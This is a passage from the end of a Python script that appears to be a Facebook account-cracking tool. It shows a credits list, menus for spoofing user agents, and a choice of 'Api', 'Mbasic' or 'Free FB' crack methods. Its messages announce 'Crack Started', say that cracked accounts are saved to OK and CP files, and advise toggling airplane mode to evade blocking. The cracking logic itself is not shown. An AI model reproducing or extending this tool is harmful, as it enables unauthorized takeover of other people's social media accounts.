    mlaku('%s     • %sRizky Dev'%(K,P))
    mlaku('%s     • %sIqbal Dev'%(K,P))
    mlaku('%s     • %sAap Afandi'%(K,P))
    mlaku('%s     • %sFallen'%(K,P))
    mlaku('%s     • %sHanifan'%(K,P))
    mlaku('%s     • %sRizky Leviathan'%(K,P))
    mlaku('%s'%(K))
def var_ugen():
    print("%s[%s1%s] %sGet My User Agent"%(K,P,K,P))
    print("%s[%s2%s] %sChange User Agent %s[%sManual%s]"%(K,P,K,P,K,P,K))
    print("%s[%s3%s] %sChange User Agent %s[%sBased Of Phone Type%s]"%(K,P,K,P,K,P,K))
    print("%s[%s4%s] %sRemove User Agent"%(K,P,K,P))
    print("%s[%s5%s] %sCheck User Agent"%(K,P,K,P))
    print("%s[%s0%s] %sBack"%(K,P,K,P))
def start_method():
    print('\n%s[%s1%s] %sApi Methode'%(K,P,K,P))
    print('%s[%s2%s] %sMbasic Methode'%(K,P,K,P))
    print('%s[%s3%s] %sFree FB Methode'%(K,P,K,P))
def started():
    print('\n%s[%s•%s] %sCrack Started...'%(K,P,K,P))
    print('%s[%s•%s] %sAccount [OK] Saved To OK/%s.txt'%(K,P,K,P,tanggal))
    print('%s[%s•%s] %sAccount [CP] Saved To CP/%s.txt'%(K,P,K,P,tanggal))
    print('%s[%s•%s] %sIf No Result, Turn On Airplane Mode (5 Sec)\n'%(K,P,K,P))

def folder():
    try:os.mkdir("CP")
    except:pass
    try:os.mkdir("OK")
    except:pass

if __name__=='__main__':
  os.system('git pull')
  folder()
  menu()
